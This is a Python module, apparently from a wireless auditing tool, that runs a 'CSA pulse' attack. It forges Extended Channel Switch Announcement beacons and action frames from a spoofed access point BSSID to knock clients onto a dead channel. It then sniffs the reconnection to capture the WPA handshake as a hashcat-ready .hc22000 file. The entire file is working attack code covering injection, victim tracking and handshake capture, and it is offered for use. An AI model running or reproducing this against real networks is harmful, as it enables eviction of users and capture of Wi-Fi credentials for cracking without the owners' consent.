"""CSA pulse attack — evict a WiFi client and capture the reconnection.

The attack alternates:

  * an ATTACK window: forged Extended-CSA beacons + unicast ECSA Action frames
    are injected from the target BSSID(s) while NO sniffer is running (a
    concurrent sniffer blocks injection on some drivers, e.g. rt2800usb);
  * an OBSERVE window: the interface sniffs for a few seconds; frames are fed to
    the WiFi monitor pipeline so a reconnection handshake is captured and
    written to disk like any other Elwand handshake.

It supports several targets (BSSIDs) so the same network can be attacked on
both bands at once (2.4 + 5 GHz) — clients roam between them, so attacking only
one band misses half the time. When several targets are given, each band gets a
slice of the attack and observe windows.

Designed to be called from a worker thread. The caller must first reserve the
interface from WifiMonitorService (wifi_monitor.reserve_iface) and release it
afterwards, so the monitor does not fight for the radio.

Linux only (needs monitor mode + frame injection).
"""
import os
import time
from functools import partial

from scapy.all import (Dot11, Dot11Beacon, Dot11Elt, EAPOL, RadioTap, Raw,
                       sendp, sniff)

from src.tools.scanner import wifi_monitor as wm

BCAST = "FF:FF:FF:FF:FF:FF"
RATES = b"\x82\x84\x8b\x96\x0c\x12\x18\x24"

DEFAULTS = {
    "target_chan": 0,       # 0 = auto dead channel per band
    "attack_window": 8.0,   # seconds of injection per cycle (sniffer OFF)
    "observe_window": 4.0,  # seconds of capture per cycle (sniffer ON)
    "csa_interval": 0.02,   # seconds between CSA bursts during attack
    "beacons": 1,           # broadcast ECSA beacons per burst
    "actions": 1,           # unicast ECSA action frames per client per burst
    "count": 3,             # CSA switch count
    "tx_rate": 2,           # radiotap Rate (2 = 1 Mbps)
    "width": 80,            # 5 GHz BSS width (operating class)
    "probe_target": True,   # briefly check the target channel each cycle
    "duration": 60.0,       # total seconds (0 = until stop_event)
}


def _op_class_for(ch, width=80):
    if 1 <= ch <= 13:
        return 81
    wide = {20: 0, 40: 1, 80: 2}.get(width, 2)
    if 36 <= ch <= 48:
        return 115 + wide
    if 52 <= ch <= 64:
        return 118 + wide
    if 100 <= ch <= 144:
        return 121 + wide
    if 149 <= ch <= 165:
        return 124 + wide
    return 0


def _is_24(ch):
    return 1 <= ch <= 14


def _dead_chan(ap_chan, user_target):
    """Pick a same-band 'dead' channel to evict the client to."""
    if user_target and _is_24(ap_chan) == _is_24(user_target):
        return user_target
    if _is_24(ap_chan):
        return 6 if ap_chan != 6 else 1
    return 48 if ap_chan != 48 else 36


def _rtap(rate):
    return RadioTap(present="Rate+TXFlags", Rate=rate, TXFlags=0x0018)


def _ecsa_beacon(bssid, ssid, from_ch, to_ch, count, opclass, rate):
    elt = Dot11Elt(ID=60, info=bytes([1, opclass & 0xFF, to_ch & 0xFF,
                                      count & 0xFF]))
    return (_rtap(rate)
            / Dot11(type=0, subtype=8, addr1=BCAST, addr2=bssid, addr3=bssid)
            / Dot11Beacon(cap=0x0431)
            / Dot11Elt(ID="SSID", info=ssid)
            / Dot11Elt(ID="Rates", info=RATES)
            / Dot11Elt(ID="DSset", info=bytes([from_ch & 0xFF]))
            / elt)


def _ecsa_action(bssid, dst, to_ch, count, opclass, rate):
    elt = Dot11Elt(ID=60, info=bytes([1, opclass & 0xFF, to_ch & 0xFF,
                                      count & 0xFF]))
    return (_rtap(rate)
            / Dot11(type=0, subtype=13, addr1=dst, addr2=bssid, addr3=bssid)
            / Raw(bytes([0, 4]))
            / elt)


def _handshake_path(ssid, bssid):
    try:
        from src.elwand_paths import handshakes_dir
        safe = "".join(c if c.isalnum() or c in "._-" else "_"
                       for c in (ssid or "hidden")) or "hidden"
        return os.path.join(str(handshakes_dir()),
                            f"{safe}_{bssid.replace(':', '')}.hc22000")
    except Exception:
        return ""


def csa_pulse(iface, bssid=None, client=None, ssid="", channel=0,
              targets=None, on_log=None, stop_event=None, **opts):
    """Run the CSA pulse attack on ``iface``.

    ``targets`` is a list of ``(bssid, channel)`` pairs; if omitted, a single
    target is built from ``bssid``/``channel``. ``client`` None = broadcast
    (beacons only). Returns a summary dict.
    """
    opt = dict(DEFAULTS)
    opt.update({k: v for k, v in opts.items() if v is not None})
    log = on_log or (lambda *a, **k: None)
    done = stop_event or _Never()
    client = wm._mac(client) if client else None

    if targets:
        tg = [(wm._mac(b), int(c)) for (b, c) in targets]
    elif bssid:
        tg = [(wm._mac(bssid), int(channel or 0))]
    else:
        tg = []
    tg = [(b, c) for (b, c) in tg if b]

    summary = {"ok": False, "reason": "", "beacons": 0, "actions": 0,
               "cycles": 0, "eapol": 0, "handshakes": 0, "target_seen": False,
               "hc22000": "", "targets": [b for b, _ in tg]}

    if not wm.injection_supported():
        summary["reason"] = "Frame injection is Linux-only."
        return summary
    if not tg:
        summary["reason"] = "No target BSSID."
        return summary
    if any(c == 0 for _, c in tg):
        summary["reason"] = "Unknown channel for a target BSSID."
        return summary

    ssid_bytes = (ssid or "").encode("utf-8", errors="replace")
    # (bssid, ap_channel, dead_channel)
    tinfo = [(b, c, _dead_chan(c, int(opt["target_chan"]))) for b, c in tg]
    paths = [_handshake_path(ssid, b) for b, _, _ in tinfo]
    base_handshakes = wm.get_stats().get("handshakes", 0)
    # Pre-register the BSSIDs so Elwand attributes EAPOL even before its first
    # beacon is sniffed in the observe window.
    try:
        for b, _, _ in tinfo:
            wm._known_bssids.add(b)
    except Exception:
        pass

    if not wm._enter_monitor(iface):
        summary["reason"] = f"Could not put {iface} in monitor mode."
        return summary

    stats = {"eapol": 0, "victim": 0}
    victim_mac = client or (tinfo[0][0] if tinfo else "")

    def _observe(pkt):
        try:
            if pkt.haslayer(EAPOL):
                stats["eapol"] += 1
        except Exception:
            pass
        try:
            d = pkt[Dot11]
            if any(wm._mac(x) == victim_mac
                   for x in (d.addr1, d.addr2, d.addr3)):
                stats["victim"] += 1
        except Exception:
            pass
        try:
            wm._process(pkt, device=iface)
        except Exception:
            pass

    def _fire(b, from_ch, to_ch):
        op = _op_class_for(to_ch, int(opt["width"]))
        n = 0
        for _ in range(int(opt["beacons"])):
            sendp(_ecsa_beacon(b, ssid_bytes, from_ch, to_ch,
                               int(opt["count"]), op, int(opt["tx_rate"])),
                  iface=iface, verbose=0)
            n += 1
        for dst in ([client] if client else [BCAST]):
            for _ in range(int(opt["actions"])):
                sendp(_ecsa_action(b, dst, to_ch, int(opt["count"]), op,
                                   int(opt["tx_rate"])),
                      iface=iface, verbose=0)
                n += 1
        return n

    def _probe(dead_ch):
        wm._set_channel(iface, dead_ch)
        seen = {"n": 0}

        def _cnt(pkt):
            try:
                d = pkt[Dot11]
                if any(wm._mac(x) == victim_mac
                       for x in (d.addr1, d.addr2, d.addr3)):
                    seen["n"] += 1
            except Exception:
                pass

        try:
            sniff(iface=iface, prn=_cnt, timeout=0.4, store=0)
        except Exception:
            pass
        return seen["n"]

    t0 = time.time()
    log("[*] CSA pulse on %s -> %s (targets: %s)"
        % (iface, ssid or "?", ", ".join("%s@ch%d" % (b, c)
                                         for b, c, _ in tinfo)))
    try:
        while True:
            if done.is_set():
                break
            if opt["duration"] and (time.time() - t0) >= opt["duration"]:
                break

            n_t = len(tinfo)
            # ---- ATTACK window (sniffer OFF), slice per target ----
            slice_s = max(0.4, float(opt["attack_window"]) / n_t)
            total = 0
            for b, ap_ch, dead_ch in tinfo:
                if done.is_set():
                    break
                wm._set_channel(iface, ap_ch)
                a_end = time.time() + slice_s
                last = 0.0
                while time.time() < a_end and not done.is_set():
                    if (time.time() - last) >= float(opt["csa_interval"]):
                        total += _fire(b, ap_ch, dead_ch)
                        last = time.time()
                    time.sleep(0.004)
            summary["beacons"] += total
            log("[*] attack window: %d CSA frames (%.0fs elapsed)"
                % (total, time.time() - t0))

            # ---- OBSERVE window (sniffer ON), sample each target channel ----
            stats["eapol"] = 0
            stats["victim"] = 0
            obs_s = max(0.4, float(opt["observe_window"]) / n_t)
            for b, ap_ch, dead_ch in tinfo:
                wm._set_channel(iface, ap_ch)
                try:
                    sniff(iface=iface, prn=_observe, lfilter=wm._is_mgmt,
                          timeout=obs_s, store=0)
                except Exception as e:
                    log(f"[!] observe error: {e}", "error")
            summary["eapol"] += stats["eapol"]
            log("[*] observe window: %d EAPOL / %d victim frames"
                % (stats["eapol"], stats["victim"]))

            if opt["probe_target"]:
                for b, ap_ch, dead_ch in tinfo:
                    n = _probe(dead_ch)
                    if n:
                        summary["target_seen"] = True
                        log("[+] victim seen on dead channel %d (%d frames)"
                            % (dead_ch, n), "success")

            hs = wm.get_stats().get("handshakes", 0)
            if hs > base_handshakes:
                summary["handshakes"] = hs - base_handshakes
                summary["hc22000"] = next(
                    (p for p in paths if p and os.path.exists(p)),
                    paths[0] if paths else "")
                log("[+] handshake captured (%d new) -> %s"
                    % (summary["handshakes"], summary["hc22000"]), "success")
            summary["cycles"] += 1
    except Exception as e:
        summary["reason"] = str(e)
        log(f"[!] attack error: {e}", "error")
    finally:
        try:
            wm.flush_handshakes()
        except Exception:
            pass
        try:
            wm._exit_monitor(iface)
        except Exception:
            pass

    hs = wm.get_stats().get("handshakes", 0)
    summary["handshakes"] = hs - base_handshakes
    if summary["handshakes"] and not summary["hc22000"]:
        summary["hc22000"] = next((p for p in paths if p and os.path.exists(p)),
                                  paths[0] if paths else "")
    summary["ok"] = True
    summary["reason"] = summary["reason"] or "done"
    return summary


class _Never:
    def is_set(self):
        return False
